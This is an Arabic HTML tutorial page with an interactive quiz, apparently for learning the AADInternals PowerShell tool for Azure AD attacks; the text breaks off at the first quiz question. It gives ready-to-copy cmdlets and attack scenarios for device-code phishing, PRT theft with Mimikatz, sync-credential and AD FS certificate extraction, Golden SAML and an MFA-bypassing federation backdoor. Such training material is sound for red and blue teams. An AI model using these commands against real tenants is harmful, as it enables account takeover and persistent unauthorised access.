<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ุฏููู AADInternals ุงูุดุงูู ูุน ุงูุงูุชุญุงู ุงูุชูุงุนูู</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', 'Tahoma', sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e6e6e6;
            line-height: 1.8;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
        }

        .signature {
            position: fixed;
            bottom: 10px;
            left: 10px;
            color: rgba(255, 255, 255, 0.15);
            font-size: 0.7em;
            font-family: monospace;
            pointer-events: none;
            z-index: 1000;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(25, 25, 45, 0.8);
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
        }

        .header h1 {
            color: #00ff88;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }

        .section {
            background: rgba(30, 30, 50, 0.7);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            border: 1px solid #333;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
        }

        .section:hover { border-color: #00d4ff; box-shadow: 0 0 15px rgba(0, 212, 255, 0.2); }

        .section h2 {
            color: #f78166;
            border-right: 4px solid #f78166;
            padding-right: 16px;
            margin: 32px 0 16px 0;
            cursor: pointer;
            font-size: 1.5em;
            transition: all 0.2s ease;
        }

        .section h2:hover { color: #58a6ff; border-right-color: #58a6ff; }

        .section h3 { color: #7ee787; margin: 24px 0 12px 0; font-size: 1.2em; }

        .section-content { transition: all 0.3s ease; }

        .expand-icon { display: inline-block; margin-right: 8px; transition: transform 0.2s ease; }

        .command-box {
            background: #0d0d1a;
            border: 1px solid #00ff88;
            border-radius: 8px;
            padding: 15px;
            margin: 12px 0;
            font-family: monospace;
            color: #00ff88;
            direction: ltr;
            text-align: left;
            cursor: pointer;
        }

        .command-box::before { content: "$ "; color: #f78166; }

        .example-box {
            background: rgba(126, 231, 135, 0.1);
            border-left: 4px solid #7ee787;
            padding: 16px;
            margin: 12px 0;
            border-radius: 6px;
        }

        .warning-box {
            background: rgba(255, 0, 0, 0.1);
            border: 2px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
        }

        .technical-box {
            background: rgba(88, 166, 255, 0.1);
            border-left: 4px solid #58a6ff;
            padding: 16px;
            margin: 12px 0;
            border-radius: 6px;
        }

        .self-question {
            background: rgba(255, 170, 0, 0.1);
            border-right: 4px solid #ffaa00;
            padding: 15px;
            margin: 20px 0;
            border-radius: 0 8px 8px 0;
        }

        .self-question h4 { color: #ffaa00; margin-bottom: 10px; }

        .tool-image {
            width: 100%;
            max-width: 800px;
            border-radius: 10px;
            margin: 20px auto;
            display: block;
            border: 2px solid #333;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
        }

        .image-caption {
            text-align: center;
            color: #aaa;
            font-size: 0.9em;
            margin-top: 10px;
            margin-bottom: 20px;
        }

        .exam-button {
            background: linear-gradient(45deg, #ff6b00, #ffaa00);
            color: #0d0d1a;
            border: none;
            padding: 20px 40px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            font-size: 1.3em;
            margin: 30px auto;
            display: block;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.4);
        }

        .exam-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 107, 0, 0.6);
        }

        .lesson-card {
            background: rgba(30, 30, 50, 0.7);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            border: 1px solid #333;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
        }

        .lesson-title {
            color: #00d4ff;
            font-size: 1.8em;
            margin-bottom: 15px;
            border-right: 5px solid #00d4ff;
            padding-right: 15px;
        }

        .quiz-section {
            background: rgba(40, 40, 60, 0.8);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid #444;
        }

        .quiz-question {
            color: #ffaa00;
            font-size: 1.3em;
            margin-bottom: 15px;
        }

        .quiz-options { display: grid; gap: 10px; margin-bottom: 20px; }

        .quiz-option {
            background: #2a2a3a;
            border: 2px solid #555;
            border-radius: 8px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 1.1em;
        }

        .quiz-option:hover { border-color: #00d4ff; background: rgba(0, 212, 255, 0.1); }

        .quiz-option.correct { border-color: #00ff88; background: rgba(0, 255, 136, 0.2); }

        .quiz-option.incorrect { border-color: #ff0000; background: rgba(255, 0, 0, 0.2); }

        .quiz-option.disabled { cursor: not-allowed; opacity: 0.6; }

        .feedback {
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            display: none;
        }

        .feedback.correct {
            background: rgba(0, 255, 136, 0.1);
            border-left: 4px solid #00ff88;
            color: #00ff88;
        }

        .feedback.incorrect {
            background: rgba(255, 0, 0, 0.1);
            border-left: 4px solid #ff0000;
            color: #ff6666;
        }

        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
        }

        .btn {
            background: linear-gradient(45deg, #00ff88, #00d4ff);
            color: #0d0d1a;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
            transition: all 0.3s ease;
        }

        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4); }

        .btn:disabled { background: #555; cursor: not-allowed; }

        .btn-success { background: linear-gradient(45deg, #00ff88, #008800); }

        .difficulty-badge {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 15px;
            font-size: 0.8em;
            font-weight: bold;
            margin-right: 10px;
        }

        .difficulty-easy { background: #00ff88; color: #000; }
        .difficulty-medium { background: #ffaa00; color: #000; }
        .difficulty-hard { background: #ff6b00; color: #fff; }
        .difficulty-expert { background: #ff0000; color: #fff; }

        .consequences-box {
            background: rgba(255, 0, 0, 0.15);
            border-left: 4px solid #ff0000;
            padding: 10px;
            margin-top: 10px;
            border-radius: 6px;
        }

        .hidden { display: none !important; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .fade-in { animation: fadeIn 0.5s ease; }

        @media (max-width: 768px) {
            .container { padding: 15px; }
            .header h1 { font-size: 1.8em; }
            .lesson-title { font-size: 1.4em; }
            .nav-buttons { flex-direction: column; gap: 10px; }
        }
    </style>
</head>
<body>
    <div class="signature">Kali@~linux</div>
    <div class="container">
        <!-- ==== ุฑุฃุณ ุงูุตูุญุฉ ==== -->
        <div class="header">
            <h1>ุฏููู AADInternals ุงูุดุงูู ูุน ุงูุงูุชุญุงู ุงูุชูุงุนูู</h1>
            <p style="color: #00d4ff; font-size: 1.2em;">ุฏููู ุดุงูู ูุน ุงุฎุชุจุงุฑ ุชูุงุนูู ุชุฏุฑูุฌู ูู ุงููุจุชุฏุฆ ุฅูู ุงูุฎุจูุฑ</p>
        </div>

        <!-- ==== ุชุญุฐูุฑ ูุงูููู ==== -->
        <div class="warning-box">
            <h3>โ๏ธ ุชุญุฐูุฑ ูุงูููู ูุฃุฎูุงูู</h3>
            <p>ูุฐุง ุงูุชุทุจูู ููุชุนููู ููุท. ุงุณุชุฎุฏุงู AADInternals ุนูู Azure AD tenants ุฏูู ุฅุฐู ุตุฑูุญ ูุนุชุจุฑ ุฌุฑููุฉ. ุงูุฃุฏุงุฉ ูุฏุฑุฌุฉ ูู MITRE ATT&CK.</p>
        </div>

        <!-- ==== ูุณู ููุฏูุฉ AADInternals ==== -->
        <div class="section fade-in">
            <h2 onclick="toggleSection(this)">
                <span class="expand-icon">โถ</span> ๐ ูุง ูู AADInternalsุ
            </h2>
            <div class="section-content hidden">
                <p><strong>AADInternals</strong> ูู PowerShell module ูุชูุฏู ูุงุฎุชุจุงุฑ ุฃูุงู Azure Active Directory (Azure AD) ู Microsoft 365. ุทูุฑู <strong>Nestori Syynimaa (@DrAzureAD)</strong> ููู ุฃุฏุงุฉ ุดุงููุฉ ููู Red Team ู Blue Team.</p>
                
                <img src="https://kimi-web-img.moonshot.cn/img/aadinternals.com/70b7d6884b4389a56f148e42f628be8bd08e5e93.png" alt="AADInternals PowerShell" class="tool-image">
                <div class="image-caption">ูุงุฌูุฉ PowerShell ูุชุดุบูู ุฃูุงูุฑ AADInternals</div>

                <h3>๐ฏ ูุง ูููุฒ AADInternals</h3>
                <ul>
                    <li>โ <strong>100+ cmdlet:</strong> ุชุบุทู ูู ุฌูุงูุจ Azure AD</li>
                    <li>โ <strong>OSINT:</strong> ุฌูุน ูุนูููุงุช ูoutsider ุจุฏูู credentials</li>
                    <li>โ <strong>Token Manipulation:</strong> ุงูุชูุงุนุจ ุจู access tokens</li>
                    <li>โ <strong>Device Compliance:</strong> ุชุฒููุฑ ุญุงูุฉ ุงูุฌูุงุฒ</li>
                    <li>โ <strong>PRT Abuse:</strong> ุงุณุชุบูุงู Primary Refresh Tokens</li>
                    <li>โ <strong>Backdoor Creation:</strong> ุฅูุดุงุก backdoors ููู MFA bypass</li>
                </ul>

                <div class="self-question">
                    <h4>๐ค ููุงุฐุง AADInternals ูุฎุชูู ุนู ุฃุฏูุงุช Azure ุงูุฃุฎุฑูุ</h4>
                    <p><strong>ุงูุฌูุงุจ:</strong> ุฃุฏูุงุช Azure ุงูุฑุณููุฉ (Az PowerShell, Azure CLI) ุชุชุทูุจ ุตูุงุญูุงุช ูุงุถุญุฉ ููุชู ุชุณุฌูู ูู ุนูููุฉ. AADInternals ูุณุชุฎุฏู internal APIs ู undocumented endpoints ูููุตูู ูุจูุงูุงุช ูุง ุชุตููุง ุงูุฃุฏูุงุช ุงูุฑุณููุฉ. ูุซูุงู: ููููู ุฌูุน ูุนูููุงุช ุนู tenant ูoutsider ุจุฏูู ุฃู ุตูุงุญูุงุชุ ุฃู ุชุฒููุฑ device compliance ุจุฏูู MDM.</p>
                </div>

                <div class="example-box">
                    <strong>๐ก ูุซุงู ุนููู:</strong> Az PowerShell ูุชุทูุจ Global Admin ูุฑุคูุฉ ุฌููุน ุงููุณุชุฎุฏููู. AADInternals ููููู ุงุณุชุฎุฑุงุฌ ูุงุฆูุฉ ุงููุณุชุฎุฏููู ูู Guest user ุนุงุฏูุฉ ุนุจุฑ ReconAsInsider. ุงููุฑู ูู ุงุณุชุบูุงู ุงูุซุบุฑุงุช ูู APIs ุจุฏูุงู ูู ุงูุงูุชุฒุงู ุจุงูู official ways.
                </div>
            </div>
        </div>

        <!-- ==== ูุณู ุงูุชุซุจูุช ==== -->
        <div class="section fade-in">
            <h2 onclick="toggleSection(this)">
                <span class="expand-icon">โถ</span> ๐ง ุงูุชุซุจูุช ูุงูุชููุฆุฉ
            </h2>
            <div class="section-content hidden">
                <h3>๐ฆ ุงูุชุซุจูุช ูู PowerShell Gallery</h3>
                <div class="command-box" onclick="copyCommand(this)">Install-Module -Name AADInternals -Force</div>
                <div class="command-box" onclick="copyCommand(this)">Import-Module AADInternals</div>

                <img src="https://kimi-web-img.moonshot.cn/img/4sysops.com/e82697c932d8e8c4a4423273253220011d8c72fd.png" alt="PowerShell Installation" class="tool-image">
                <div class="image-caption">ุชุซุจูุช PowerShell module ุนูู Windows</div>

                <div class="self-question">
                    <h4>๐ค ููุงุฐุง ูุณุชุฎุฏู -Forceุ</h4>
                    <p><strong>ุงูุฌูุงุจ:</strong> ูุฃู AADInternals ููุณ ูููุนุงู ุฑูููุงู ูู Microsoft. PowerShell ูุญุฐุฑู ุฃูู "untrusted repository". -Force ูุชุฌุงูุฒ ูุฐุง ุงูุชุญุฐูุฑ. ูุฐุง ุฎุทุฑ ุฃููู ูุฃูู ุชูุจู code ูู ูุตุฏุฑ ุบูุฑ ููุซููุ ูููู ุถุฑูุฑู ููุงุฎุชุจุงุฑ.</p>
                </div>

                <h3>๐ ุงูุชุญูู ูู ุงูุชุซุจูุช</h3>
                <div class="command-box" onclick="copyCommand(this)">Get-Command -Module AADInternals | Measure-Object</div>
                <p>ูุฌุจ ุฃู ูุธูุฑ ุฃูุซุฑ ูู 100 cmdlet.</p>

                <div class="warning-box">
                    <p>โ๏ธ <strong>ูุงู:</strong> AADInternals ูุชุทูุจ PowerShell 5.1 ุฃู PowerShell 7+. ุจุนุถ ุงูู cmdlets ูุง ุชุนูู ุนูู Linux PowerShell.
                </p></div>
            </div>
        </div>

        <!-- ==== ูุณู OSINT ูู Outsider ==== -->
        <div class="section fade-in">
            <h2 onclick="toggleSection(this)">
                <span class="expand-icon">โถ</span> ๐ต๏ธ OSINT ูู Outsider (ุจุฏูู Credentials)
            </h2>
            <div class="section-content hidden">
                <h3>๐ฏ ุฌูุน ูุนูููุงุช Tenant</h3>
                <p>ุฃู ุดุฎุต ููููู ุฌูุน ูุฐู ุงููุนูููุงุช ุจุฏูู ุชุณุฌูู ุฏุฎูู:</p>
                
                <div class="command-box" onclick="copyCommand(this)">Invoke-AADIntReconAsOutsider -DomainName company.com</div>

                <img src="https://kimi-web-img.moonshot.cn/img/s.secrss.com/b1f4c81e1a644061f4ba821f8beb224b0221faaf.png" alt="AADInternals Recon" class="tool-image">
                <div class="image-caption">ูุฎุฑุฌุงุช Invoke-AADIntReconAsOutsider ุชูุธูุฑ ูุนูููุงุช Tenant</div>

                <h3>๐ ูุง ุงูุฐู ูููุดููุ</h3>
                <ul>
                    <li><strong>Tenant ID:</strong> GUID ูุฑูุฏ ููู tenant</li>
                    <li><strong>Tenant Name:</strong> ุงูุงุณู ุงูุฏุงุฎูู (ูุซู company.onmicrosoft.com)</li>
                    <li><strong>Domains:</strong> ูู ุงููุทุงูุงุช ุงูููุณุฌูุฉ</li>
                    <li><strong>Domain Type:</strong> Managed ุฃู Federated (ูุน ADFS)</li>
                    <li><strong>DesktopSSO:</strong> ูู Seamless SSO ููููููุ</li>
                    <li><strong>MX Records:</strong> ูู ูุณุชุฎุฏู Exchange Onlineุ</li>
                </ul>

                <div class="self-question">
                    <h4>๐ค ููุงุฐุง DesktopSSO ููู ููููุงุฌูุ</h4>
                    <p><strong>ุงูุฌูุงุจ:</strong> DesktopSSO (Seamless SSO) ูุนูู ุฃู ุงููุณุชุฎุฏููู ุนูู ุงูุดุจูุฉ ุงูุฏุงุฎููุฉ ูุชู ุชุณุฌูู ุฏุฎูููู ุชููุงุฆูุงู. ุฅุฐุง ุงุณุชุทุงุน ุงูููุงุฌู ุงููุตูู ูู AZUREADSSOACC$ account (ูู Active Directory)ุ ููููู ุชุฒููุฑ tokens ูุฃู ูุณุชุฎุฏู ุจุฏูู ูุนุฑูุฉ ูููุฉ ุงููุฑูุฑ!</p>
                </div>

                <h3>๐ค User Enumeration</h3>
                <div class="command-box" onclick="copyCommand(this)">Invoke-AADIntUserEnumerationAsOutsider -UserName "admin@company.com"</div>
                <p>ูุชุญูู ููุง ุฅุฐุง ูุงู ุงููุณุชุฎุฏู ููุฌูุฏุงู ุนุจุฑ GetCredentialType API.</p>

                <div class="technical-box">
                    <strong>๐๏ธ ุงูุชูููุฉ:</strong> API ููุฑุฌุน "IfExistsResult" - 0 ูุนูู ุงููุณุชุฎุฏู ููุฌูุฏุ 1 ูุนูู ุบูุฑ ููุฌูุฏ. ูุง ูุชุทูุจ authentication!
                </div>
            </div>
        </div>

        <!-- ==== ูุณู Access Tokens ==== -->
        <div class="section fade-in">
            <h2 onclick="toggleSection(this)">
                <span class="expand-icon">โถ</span> ๐ Access Tokens ูุงููุตุงุฏูุฉ
            </h2>
            <div class="section-content hidden">
                <h3>๐ซ ุงูุญุตูู ุนูู Access Token</h3>
                <div class="command-box" onclick="copyCommand(this)">Get-AADIntAccessTokenForAADGraph -SaveToCache</div>
                <div class="command-box" onclick="copyCommand(this)">Get-AADIntAccessTokenForMSGraph -SaveToCache</div>

                <div class="self-question">
                    <h4>๐ค ูุง ุงููุฑู ุจูู AAD Graph ู MS Graphุ</h4>
                    <p><strong>ุงูุฌูุงุจ:</strong> AAD Graph ูู API ูุฏูู (deprecated) ูููู ูุง ูุฒุงู ูุนูู ูููุนุทู ูุตููุงู ูุจุนุถ ุงูุจูุงูุงุช ุงูุชู MS Graph ูุง ููุนุทููุง. MS Graph ูู ุงูุญุฏูุซ ูุงููููุตู ุจู. AADInternals ูุฏุนู ุงูุงุซููู ููู backward compatibility ูุงููุตูู ููุจูุงูุงุช ุงููุฏููุฉ.</p>
                </div>

                <h3>๐ ุงุณุชุฎุฏุงู Token ูุน AzureAD Module</h3>
                <div class="command-box" onclick="copyCommand(this)">Connect-AzureAD -AadAccessToken (Get-AADIntAccessTokenForAADGraph)</div>

                <div class="example-box">
                    <strong>๐ก ูุตูุญุฉ:</strong> ุงุณุชุฎุฏู <code>-SaveToCache</code> ูุชุฎุฒูู Token ูู ุงูุฐุงูุฑุฉ. ูุฐุง ูููุน ุฅุนุงุฏุฉ ุงููุตุงุฏูุฉ ูู ูู cmdlet.
                </div>

                <h3>๐ญ Device Code Phishing</h3>
                <div class="command-box" onclick="copyCommand(this)">Invoke-AADIntPhishing -Recipients "victim@company.com" -Subject "Urgent: Verify your account"</div>

                <img src="https://kimi-web-img.moonshot.cn/img/i.ytimg.com/90bd78b2da550c94090e5a62c8744ae4c4a4ec55.jpg" alt="Device Code Phishing" class="tool-image">
                <div class="image-caption">ูุฌูู Device Code Phishing - ุงููุณุชุฎุฏู ููุฏุฎู ุงูููุฏ ูู microsoft.com</div>

                <div class="warning-box">
                    <p>โ๏ธ <strong>ูุฐุง ูุฌูู ุญูููู!</strong> ุงููุณุชุฎุฏู ูุชููู ุจุฑูุฏุงู ูุทูุจ ููู ุฅุฏุฎุงู ููุฏ ูู microsoft.com. ุฅุฐุง ูุงููุ ูุญุตู ุงูููุงุฌู ุนูู access token ุตุงูุญ ูู 15 ุฏูููุฉ (ูุงุจู ููุชุฌุฏูุฏ).
                </p></div>
            </div>
        </div>

        <!-- ==== ูุณู PRT ู Device Abuse ==== -->
        <div class="section fade-in">
            <h2 onclick="toggleSection(this)">
                <span class="expand-icon">โถ</span> ๐ป ุงุณุชุบูุงู ุงูุฃุฌูุฒุฉ ู PRT
            </h2>
            <div class="section-content hidden">
                <h3>๐ Primary Refresh Token (PRT)</h3>
                <p>PRT ูู "ููุชุงุญ ุงูููููุฉ" ูู Azure AD. ุฅุฐุง ุญุตูุช ุนูููุ ููููู ุงูุชุญุงู ูููุฉ ุงููุณุชุฎุฏู:</p>
                
                <div class="command-box" onclick="copyCommand(this)">Get-AADIntUserPRTToken</div>
                <div class="command-box" onclick="copyCommand(this)">Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken</div>

                <div class="self-question">
                    <h4>๐ค ูุง ูู PRT ุจุงูุถุจุทุ</h4>
                    <p><strong>ุงูุฌูุงุจ:</strong> PRT ูู refresh token ุฎุงุต ุจู Windows 10/11. ููุฎุฒู ูู LSASS (Local Security Authority Subsystem Service). ูุญุชูู ุนูู ููุงุชูุญ ุชุดููุฑ ุชูุณุชุฎุฏู ูุชูููุน cookies. ุฅุฐุง ุณุฑูุช PRT + session keyุ ููููู ุฅูุดุงุก cookies ุตุงูุญุฉ ูุฃู ูููุน Microsoft.</p>
                </div>

                <h3>๐ญ ุชุฒููุฑ Device Compliance</h3>
                <div class="command-box" onclick="copyCommand(this)">Set-AADIntDeviceCompliant -DeviceId "device-guid" -Compliant</div>

                <p>ููุบูุฑ ุญุงูุฉ ุงูุฌูุงุฒ ุฅูู "Compliant" ุญุชู ูู ูู ููู ูุฐูู. ูุฐุง ูุชุฌุงูุฒ Conditional Access policies ุงูุชู ุชุชุทูุจ ุฃุฌูุฒุฉ compliant.</p>

                <div class="technical-box">
                    <strong>๐๏ธ ุขููุฉ ุงููุฌูู:</strong> Azure AD ูุซู ูู ุชูุงุฑูุฑ MDM (Mobile Device Management). AADInternals ููุฑุณู ุชูุฑูุฑุงู ูุฒููุงู ูุจุงุดุฑุฉ ุฅูู Azure AD ุนุจุฑ AAD Graph APIุ ูุชุฌุงูุฒุงู MDM ุงูุญูููู.
                </div>

                <h3>๐ PRT ูุน Mimikatz</h3>
                <div class="command-box" onclick="copyCommand(this)"># ูู Mimikatz: dpapi::cloudapkd /prt:xxx /key:xxx</div>
                <div class="command-box" onclick="copyCommand(this)">New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce</div>

                <div class="example-box">
                    <strong>๐ก ุณููุงุฑูู ุงููุฌูู:</strong> 1) ุงุฎุชุฑุงู workstation ุนุงุฏูุฉ 2) ุงุณุชุฎุฑุงุฌ PRT ุจู Mimikatz 3) ููู PRT ุฅูู ุฌูุงุฒ ุขุฎุฑ 4) ุฅูุดุงุก tokens ูุงููุตูู ููุดุจูุฉ ูู user compromised.
                </div>
            </div>
        </div>

        <!-- ==== ูุณู Azure AD Connect ==== -->
        <div class="section fade-in">
            <h2 onclick="toggleSection(this)">
                <span class="expand-icon">โถ</span> ๐ ุงุณุชุบูุงู Azure AD Connect
            </h2>
            <div class="section-content hidden">
                <h3>โ๏ธ ุฎุทูุฑุฉ Azure AD Connect</h3>
                <p>Azure AD Connect ููุฒุงูู ุจูู Active Directory on-premises ู Azure AD. ุงูุชูุงู ุตูุงุญูุงุช ุนููู = ุงูุชูุงู ุงูููููุฉ:</p>
                
                <div class="command-box" onclick="copyCommand(this)">Get-AADIntSyncCredentials</div>

                <div class="self-question">
                    <h4>๐ค ููุงุฐุง Get-AADIntSyncCredentials ุฎุทูุฑ ุฌุฏุงูุ</h4>
                    <p><strong>ุงูุฌูุงุจ:</strong> ูุฐุง cmdlet ูุณุชุฎุฑุฌ ุจูุงูุงุช ุงุนุชูุงุฏ Azure AD Connect sync account. ูุฐุง account ูู ุตูุงุญูุงุช DCSync ุชูุฑูุจุงู - ููููู ูุฑุงุกุฉ ุฃู hash ูุฃู ูุณุชุฎุฏู ูู Azure AD. ุฅุฐุง ูุงู AD Connect ุนูู DCุ ุงูููุงุฌู ูุณุชุทูุน ุฃูุถุงู ุงุณุชุฎุฑุงุฌ hashes ูู on-prem AD.</p>
                </div>

                <h3>๐ญ ุชุนุฏูู Synced Users</h3>
                <div class="command-box" onclick="copyCommand(this)">$creds = Get-Credential</div>
                <div class="command-box" onclick="copyCommand(this)">Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache</div>
                <div class="command-box" onclick="copyCommand(this)">Set-AADIntUser -UserPrincipalName "admin@company.com" -ImmutableId "HACKED"</div>

                <div class="warning-box">
                    <p>โ๏ธ <strong>ูุฐุง ููุณุฑ ุงููุฒุงููุฉ!</strong> ุชุบููุฑ ImmutableId ูููุน ุงููุณุชุฎุฏู ูู ุงููุฒุงููุฉ ูุน on-prem AD. ุงุณุชุฎุฏู ููุท ูู ุจูุฆุงุช test.
                </p></div>

                <h3>๐ Pass-through Authentication</h3>
                <div class="command-box" onclick="copyCommand(this)">Get-AADIntPTASecrets</div>
                <p>ูุณุชุฎุฑุฌ ููุงุชูุญ ุชุดููุฑ ูู Pass-through Authentication agents. ูููู ุงุณุชุฎุฏุงููุง ูุงุนุชุฑุงุถ ุงููุตุงุฏูุงุช.</p>
            </div>
        </div>

        <!-- ==== ูุณู AD FS ==== -->
        <div class="section fade-in">
            <h2 onclick="toggleSection(this)">
                <span class="expand-icon">โถ</span> ๐๏ธ ุงุณุชุบูุงู AD FS
            </h2>
            <div class="section-content hidden">
                <h3>๐ซ ุชุตุฏูุฑ ุดูุงุฏุงุช AD FS</h3>
                <p>AD FS (Active Directory Federation Services) ูู "ุงูููุชุงุญ ุงูุฐูุจู" ููู SSO:</p>
                
                <div class="command-box" onclick="copyCommand(this)">Export-AADIntADFSCertificates</div>

                <div class="self-question">
                    <h4>๐ค ููุงุฐุง ุดูุงุฏุงุช AD FS ูููุฉุ</h4>
                    <p><strong>ุงูุฌูุงุจ:</strong> AD FS ููุณุชุฎุฏู ูุชูููุน SAML tokens. ุฅุฐุง ุณุฑูุช ุดูุงุฏุฉ ุงูุชูููุน (Token Signing Certificate)ุ ููููู ุฅูุดุงุก SAML tokens ุตุงูุญุฉ ูุฃู ูุณุชุฎุฏู ูู ุฃู ุชุทุจูู ูุณุชุฎุฏู AD FS ููู SSO. ูุฐุง ููุณูู Golden SAML attack.</p>
                </div>

                <h3>๐ญ ุฅูุดุงุก SAML Token ูุฒูู</h3>
                <div class="command-box" onclick="copyCommand(this)">New-AADIntSAMLToken -UserPrincipalName "admin@company.com" -ImmutableId "xxx"</div>

                <div class="technical-box">
                    <strong>๐๏ธ Golden SAML:</strong> ูุซู Golden Ticket ูู Kerberos ููู ููุณุญุงุจุฉ. ูุนูู ุญุชู ูู ุชู ุชุบููุฑ ูููุฉ ูุฑูุฑ ุงููุณุชุฎุฏู ุฃู ุชุนุทูู ุญุณุงุจู!
                </div>

                <h3>๐ ุงูุชุดุงู AD FS</h3>
                <div class="command-box" onclick="copyCommand(this)">Get-AADIntLoginInformation -UserName "user@company.com"</div>
                <p>ููุธูุฑ ุฅุฐุง ูุงู ุงููุทุงู ูุณุชุฎุฏู Federated authentication (AD FS) ุฃู Managed.</p>
            </div>
        </div>

        <!-- ==== ูุณู Backdoors ู Persistence ==== -->
        <div class="section fade-in">
            <h2 onclick="toggleSection(this)">
                <span class="expand-icon">โถ</span> ๐ช Backdoors ูุขููุงุช ุงูุงุณุชูุฑุงุฑูุฉ
            </h2>
            <div class="section-content hidden">
                <h3>๐ฏ ุฅูุดุงุก Backdoor ููู MFA Bypass</h3>
                <div class="command-box" onclick="copyCommand(this)">ConvertTo-AADIntBackdoor -DomainName "backdoor.company.myo365.site"</div>

                <div class="self-question">
                    <h4>๐ค ููู ูุนูู Backdoor ูู Azure ADุ</h4>
                    <p><strong>ุงูุฌูุงุจ:</strong> ูููุดุฆ IssuerUri ูุฎุตุต (ูุซู http://any.sts/xxx). ุนูุฏูุง ููุฑุณู SAML token ูู ูุฐุง Issuerุ Azure AD ููุจูู ูู valid. ุงูููุงุฌู ูููุดุฆ SAML token ูููุน ุจููุชุงุญู ุงูุฎุงุตุ ูAzure AD ูุซู ุจู. ูุฐุง ูุชุฌุงูุฒ MFA ูุฃู "IdP" ุงูููุงุฌู ูุง ููุทุจู MFA.</p>
                </div>

                <h3>๐ญ ุงุณุชุฎุฏุงู Backdoor</h3>
                <div class="command-box" onclick="copyCommand(this)">Open-AADIntOffice365Portal -Issuer "http://any.sts/xxx" -UserName "admin@company.com"</div>

                <div class="warning-box">
                    <p>โ๏ธ <strong>ูุฐุง backdoor ุญูููู!</strong> ููุณุชุฎุฏู ูู ูุฌูุงุช NOBELIUM (SolarWinds). Microsoft ูุง ุชุณุชุทูุน ุงูุชุดุงูู ุจุณูููุฉ ูุฃูู ูุจุฏู ูู IdP ุดุฑุนู.
                </p></div>

                <h3>๐ ุฅุถุงูุฉ Device ูุฒูู</h3>
                <div class="command-box" onclick="copyCommand(this)">Join-AADIntDeviceToAzureAD -DeviceName "HACKED-PC" -DeviceType "Windows"</div>
                <p>ููุณุฌู ุฌูุงุฒุงู ูุฒููุงู ูู Azure AD. ูููู ุงุณุชุฎุฏุงูู ูู Conditional Access bypass.</p>
            </div>
        </div>

        <!-- ==== ุฒุฑ ุงูุงูุชุญุงู ==== -->
        <div class="section fade-in" style="text-align: center; padding: 40px;">
            <button class="exam-button" onclick="startExam()">๐ฎ ุจุฏุก ุงูุงูุชุญุงู ุงูุชูุงุนูู (20 ุณุคุงู)</button>
            <p style="margin-top: 15px; color: #aaa;">5 ุฃุณุฆูุฉ ุณููุฉ (3 ุฎูุงุฑุงุช) โข 9 ุฃุณุฆูุฉ ุตุนุจุฉ (5 ุฎูุงุฑุงุช) โข 6 ุฃุณุฆูุฉ ุฎุจูุฑ (6 ุฎูุงุฑุงุช)</p>
            <p style="color: #ffaa00; font-size: 0.9em;">โ๏ธ ุงูุฅุฌุงุจุงุช ููุฒุนุฉ ุนุดูุงุฆูุงู ูู ูู ูุฑุฉ!</p>
        </div>

        <!-- ==== ุญุงููุฉ ุงูุงูุชุญุงู ==== -->
        <div id="examContainer" class="hidden"></div>

    </div>

    <script>
        // ==== ุฏูุงู ุงูุฏููู ุงูุชูุถูุญู ====
        function toggleSection(element) {
            const content = element.nextElementSibling;
            const icon = element.querySelector('.expand-icon');
            
            if (content.classList.contains('hidden')) {
                content.classList.remove('hidden');
                icon.innerHTML = 'โผ';
            } else {
                content.classList.add('hidden');
                icon.innerHTML = 'โถ';
            }
        }

        function copyCommand(element) {
            const text = element.textContent.trim().replace('$ ', '');
            navigator.clipboard.writeText(text).then(() => {
                element.style.background = '#00ff88';
                element.style.color = '#0d0d1a';
                setTimeout(() => {
                    element.style.background = '#0d0d1a';
                    element.style.color = '#00ff88';
                }, 500);
            });
        }

        // ==== ุจูุงูุงุช ุงูุงูุชุญุงู (20 ุณุคุงู) ====
        let currentLesson = 1;
        let score = 0;
        let mistakes = [];
        let examStarted = false;

        const examQuestions = [
            // --- 5 ุฃุณุฆูุฉ ุณููุฉ (3 ุฎูุงุฑุงุช) ---
            {
                difficulty: "easy",
                question: "ูุง ูู AADInternalsุ",
                options: [
                    { text: "PowerShell module ูุงุฎุชุจุงุฑ ุฃูุงู Azure AD", correct: true },
                    { text: "ุฃุฏุงุฉ ูุญุต ุซุบุฑุงุช ุงูุดุจูุงุช", correct: false },
                    { text: "ุจุฑูุงูุฌ ูููุงูุญุฉ ุงูููุฑูุณุงุช", correct: false }
                ],
